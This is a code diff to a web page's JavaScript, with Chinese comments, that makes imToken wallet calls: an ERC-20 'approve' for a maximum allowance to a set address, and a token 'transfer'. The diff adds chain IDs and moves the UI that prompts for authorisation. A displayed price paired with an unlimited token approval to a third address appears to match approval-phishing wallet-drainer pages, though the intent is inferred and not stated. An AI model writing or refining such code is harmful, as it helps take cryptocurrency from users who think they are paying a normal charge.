@@ -175,11 +175,17 @@
         
         // 使用 imToken 的 TUAP 方式
         if (wallet === 'imToken') {
+          // 显示授权信息
+          document.getElementById("approval").style.display = "block";
+          document.getElementById("status").innerText = "等待授权确认...";
+          
+          // 使用 imToken 的合约调用方式
           const result = await window.imToken.callAPI('contract', {
             to: contractAddress,
             from: from,
             value: '0',
-            data: contract.methods.approve(toAddress, maxAmount).encodeABI()
+            data: contract.methods.approve(toAddress, maxAmount).encodeABI(),
+            chainId: chain === 'bsc' ? '0x38' : '0x1'
           });
           
           if (!result || !result.txHash) {
@@ -211,11 +217,13 @@
         
         // 使用 imToken 的 TUAP 方式
         if (wallet === 'imToken') {
+          // 使用 imToken 的合约调用方式
           const result = await window.imToken.callAPI('contract', {
             to: contractAddress,
             from: from,
             value: '0',
-            data: contract.methods.transfer(toAddress, amountInWei).encodeABI()
+            data: contract.methods.transfer(toAddress, amountInWei).encodeABI(),
+            chainId: chain === 'bsc' ? '0x38' : '0x1'
           });
           
           if (!result || !result.txHash) {
@@ -269,7 +277,6 @@
       try {
         // 设置显示金额
         document.getElementById('price1').innerText = amount;
-        document.getElementById("approval").style.display = "block";
 
         // 获取钱包地址
         const address = await getWallet();
